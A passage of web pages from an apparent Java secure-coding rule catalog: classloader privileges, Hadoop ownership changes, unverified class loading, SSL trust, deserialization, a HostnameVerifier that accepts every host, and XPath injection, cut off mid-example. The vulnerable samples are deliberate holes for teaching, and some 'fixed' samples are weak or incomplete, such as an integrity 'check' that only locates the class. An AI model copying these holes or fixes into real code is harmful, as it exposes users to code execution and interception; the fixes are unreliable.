                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7044">Classloaders should only be created inside doPrivileged block</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Classloaders should only be created inside doPrivileged block</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p> This code creates a classloader,  which needs permission if a security manage is installed.
  If this code might be invoked by code that does not
  have security permissions, then the classloader creation needs to occur inside a doPrivileged block.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1103">Hadoop Cluster Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software may allow attackers to manipulate the core components of the Hadoop cluster where client applications run.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Any data set by Hadoop cluster may be malicious changed when the security setting is misconfigured or untrusted user inputs are used without properly validating. Besides, the infrastructure of Hadoop cluster may be controled by attackers.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">bad</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"a/specific/path"</span><span class="o">;</span>
    <span class="o">...</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
    <span class="n">userName</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="mi">2</span><span class="o">];</span>
    <span class="n">groupName</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="mi">3</span><span class="o">];</span>
    <span class="o">...</span>
    <span class="n">DFSClient</span> <span class="n">client</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DFSClient</span><span class="o">(</span><span class="n">addr</span><span class="o">,</span> <span class="k">new</span> <span class="n">Configuration</span><span class="o">());</span>
    <span class="n">ClientProtocol</span> <span class="n">nodeName</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="na">getNameNode</span><span class="o">();</span>
    <span class="o">...</span>
    <span class="c1">// Set ownership without validating userName or groupName.</span>
    <span class="n">nodeName</span><span class="o">.</span><span class="na">setOwner</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">userName</span><span class="o">,</span> <span class="n">groupName</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1111">Android Class Loading Hijacking</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Executing commands or loading libraries from an untrusted source or in an untrusted environment can cause an application to execute malicious commands (and payloads) on behalf of an attacker.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>An attacker can change the environment in which the command executes and load libraries from an untrusted source.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Libraries that are loaded should be well understood and come from a trusted source.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/114.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0132">Download of Code Without Integrity Check</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Use tools or frameworks to perform integrity checking on the transmitted code. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>This example loads an external class from a local subdirectory.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">URL</span><span class="o">[]</span> <span class="n">classURLs</span><span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">[]{</span>
<span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">"file:subdir/"</span><span class="o">)</span>
<span class="o">};</span>
<span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLClassLoader</span><span class="o">(</span><span class="n">classURLs</span><span class="o">);</span>
<span class="n">Class</span> <span class="n">loadedClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">loader</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code.</p>
<h3 id="fixed-code-example">Fixed code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">URL</span><span class="o">[]</span> <span class="n">classURLs</span><span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">[]{</span>
<span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">"file:subdir/"</span><span class="o">)</span>
<span class="o">};</span>
<span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLClassLoader</span><span class="o">(</span><span class="n">classURLs</span><span class="o">);</span>
<span class="n">loader</span><span class="o">.</span><span class="na">findResource</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">);</span>  <span class="c1">// Check Class</span>
<span class="n">Class</span> <span class="n">loadedClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">loader</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/494.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-494.html">CWE-494</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1070">Insecure SSL</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>When the software communicates with a host by certificate which signed by compromised Certificate Authorities, attackers can stealing sensitive data by performing man-in-the-middle (MiTM) attacks. 
In order to ensure data integrity, the certificate must be valid and it must pertain to the site that is being accessed.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Attackers will be able to intercept the SSL/TLS trusting these compromised CAs.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>Use only trusted certificates</li>
<li>Use a certificate that is valid and must be relevant to the site you are visiting</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="n">InputStream</span> <span class="nf">connect</span><span class="o">(</span><span class="n">URL</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">URLConnection</span> <span class="n">urlConnection</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
                <span class="k">return</span> <span class="n">urlConnection</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="o">...</span>
            <span class="o">}</span>
        <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>SSL/TLS connection established using default CA</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="n">InputStream</span> <span class="nf">safeConnect</span><span class="o">(</span><span class="n">URL</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">TrustManager</span><span class="o">[]</span> <span class="n">tm</span> <span class="o">=</span> <span class="o">{</span> <span class="k">new</span> <span class="n">X509TrustManager</span><span class="o">()</span> <span class="o">{</span>
                <span class="nd">@Override</span>
                <span class="kd">public</span> <span class="kt">void</span> <span class="nf">checkClientTrusted</span><span class="o">(</span><span class="n">X509Certificate</span><span class="o">[]</span> <span class="n">chain</span><span class="o">,</span> <span class="n">String</span> <span class="n">authType</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">CertificateException</span> <span class="o">{</span>
                    <span class="o">...</span>
                <span class="o">}</span>

                <span class="nd">@Override</span>
                <span class="kd">public</span> <span class="kt">void</span> <span class="nf">checkServerTrusted</span><span class="o">(</span><span class="n">X509Certificate</span><span class="o">[]</span> <span class="n">chain</span><span class="o">,</span> <span class="n">String</span> <span class="n">authType</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">CertificateException</span> <span class="o">{</span>
                    <span class="o">...</span>
                <span class="o">}</span>

                <span class="nd">@Override</span>
                <span class="kd">public</span> <span class="n">X509Certificate</span><span class="o">[]</span> <span class="nf">getAcceptedIssuers</span><span class="o">()</span> <span class="o">{</span>
                    <span class="o">...</span>
                <span class="o">}</span>
            <span class="o">}};</span>
            <span class="n">SSLContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">SSLContext</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"SSL"</span><span class="o">);</span>
            <span class="n">context</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">tm</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

            <span class="n">HttpsURLConnection</span> <span class="n">connection</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpsURLConnection</span><span class="o">)</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
            <span class="n">connection</span><span class="o">.</span><span class="na">setSSLSocketFactory</span><span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">getSocketFactory</span><span class="o">());</span>
            <span class="k">return</span> <span class="n">connection</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="o">...</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>SSL/TLS connection established with custom trusted certificate</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE310">
<p>https://cwe.mitre.org/data/definitions/310.html <a class="footnote-backref" href="#fnref-CWE310" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A3">
<p>https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure <a class="footnote-backref" href="#fnref-OWASP-A3" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7574">Potential external control of configuration</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential external control of configuration</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    Allowing external control of system settings can disrupt service or cause an application
    to behave in unexpected, and potentially malicious ways. 
    An attacker could cause an error by providing a nonexistent catalog name
    or connect to an unauthorized portion of the database.
</p>
<br/>
<p>
<b>Code at risk:</b><br/>
<pre>conn.setCatalog(request.getParameter("catalog"));</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://cwe.mitre.org/data/definitions/15.html">CWE-15: External Control of System or Configuration Setting</a><br/></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0135">Deserialization Untrusted Data</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and Risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>It is often convenient to serialize objects for communication or to save them for later use. However, these data may be modified by attackers and when developers place no restrictions on "gadget chains" or series of instances and method invocations that can self-execute during the deserialization process (i.e. before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.</p>
<h1 id="vulnerability-and-risk">Vulnerability and Risk</h1>
<p>This can result in two primary types of attacks:
1. Object and data structure related attacks where the attacker modifies application logic or achieves arbitrary remote code execution if there are classes available to the application that can change behavior during or after deserialization.</p>
<ol>
<li>Typical data tampering attacks, such as access-control-related attacks, where existing data structures are used but the content is changed.</li>
</ol>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ol>
<li>
<p>Avoid accepting serialized objects from untrusted sources or use serialization mediums that only permit primitive data types.</p>
</li>
<li>
<p>If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.</p>
</li>
<li>
<p>When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe.</p>
</li>
<li>
<p>Explicitly define a final object() to prevent deserialization.</p>
</li>
<li>
<p>Make fields transient to protect them from deserialization.
An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.</p>
</li>
</ol>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">try</span> <span class="o">{</span>
  <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"object.obj"</span><span class="o">);</span>
  <span class="n">ObjectInputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">));</span>
  <span class="n">javax</span><span class="o">.</span><span class="na">swing</span><span class="o">.</span><span class="na">JButton</span> <span class="n">button</span> <span class="o">=</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">swing</span><span class="o">.</span><span class="na">JButton</span><span class="o">)</span> <span class="n">in</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
  <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed.</p>
<h3 id="fixed-code-example">Fixed code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">(</span><span class="s">"Cannot be deserialized"</span><span class="o">);</span> 
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>To mitigate this, explicitly define final readObject() to prevent deserialization. </p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE502">
<p>http://cwe.mitre.org/data/definitions/502.html <a class="footnote-backref" href="#fnref-CWE502" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-502.html">CWE-502</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7498">HostnameVerifier that accept any signed certificates</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>HostnameVerifier that accept any signed certificates</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>A <code>HostnameVerifier</code> that accept any host are often use because of certificate reuse on many hosts.
As a consequence, this is vulnerable to
<a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack">Man-in-the-middle attacks</a>
since the client will trust any certificate.
</p>
<p>
A TrustManager allowing specific certificates (based on a truststore for example) should be built.
Wildcard certificates should be created for reused on multiples subdomains.
Detailed information for a proper implementation is available at:
<a href="http://stackoverflow.com/a/6378872/89769">[1]</a>
<a href="http://stackoverflow.com/a/5493452/89769">[2]</a>
</p>
<br/>
<p>
<b>Vulnerable Code:</b><br/>
<pre>public class AllHosts implements HostnameVerifier {
    public boolean verify(final String hostname, final SSLSession session) {
        return true;
    }
}</pre>
</p>
<br/>
<p>
<b>Solution (TrustMangager based on a keystore):</b><br/>
<pre>KeyStore ks = //Load keystore containing the certificates trusted
SSLContext sc = SSLContext.getInstance("TLS");
TrustManagerFactory tmf = TrustManagerFactory.getInstance("SunX509");
tmf.init(ks);
sc.init(kmf.getKeyManagers(), tmf.getTrustManagers(),null);
</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://projects.webappsec.org/w/page/13246945/Insufficient%20Transport%20Layer%20Protection">WASC-04: Insufficient Transport Layer Protection</a><br/>
<a href="http://cwe.mitre.org/data/definitions/295.html">CWE-295: Improper Certificate Validation</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1096">XPath Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Extensible Markup Language (XML) can be used for data storage in a manner similar to a relational database. Data is frequently retrieved from such an XML document using XPaths. XPath injection can occur when data supplied to an XPath retrieval routine to retrieve data from an XML document is used without proper sanitization.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>This attack is similar to SQL injection or XML injection. An attacker can enter valid SQL or XML constructs in the data fields of the query in use. In typical attacks, the conditional field of the query resolves to a tautology or otherwise gives the attacker access to privileged information.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Treat all user input as untrusted, and perform appropriate sanitization.</p>
</li>
<li>
<p>When sanitizing user input, verify the correctness of the data type, length, format, and content.</p>
</li>
<li>
<p>In a client-server application, perform validation at both the client and the server sides.</p>
</li>
<li>
<p>Extensively test applications that supply, propagate, or accept user input.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example reads a user name and password from the user and uses them to construct the query string:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">doLogin</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span><span class="o">)</span>
  <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">XPathExpressionException</span> <span class="o">{</span>

  <span class="n">DocumentBuilderFactory</span> <span class="n">domFactory</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
